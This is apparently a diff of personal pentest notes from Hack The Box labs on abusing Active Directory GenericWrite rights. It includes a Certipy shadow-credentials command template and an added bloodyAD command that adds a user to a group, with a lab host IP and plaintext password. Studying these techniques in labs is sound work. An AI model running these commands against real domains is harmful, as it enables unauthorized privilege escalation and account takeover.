@@ -1,3 +1,5 @@
+#####  User:
+
 The members of the group MANAGEMENT@CERTIFIED.HTB have generic write access to the user MANAGEMENT_SVC@CERTIFIED.HTB.
 
 Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
@@ -31,3 +33,12 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```bash
 certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
 ```
+
+##### Group:
+
+![[Pasted image 20250520021258.png]]
+
+```bash
+bloodyAD -d puppy.htb --host 10.129.219.21 -u levi.james -p 'KingofAkron2025!' add groupMember 'developers' levi.james
+```
+
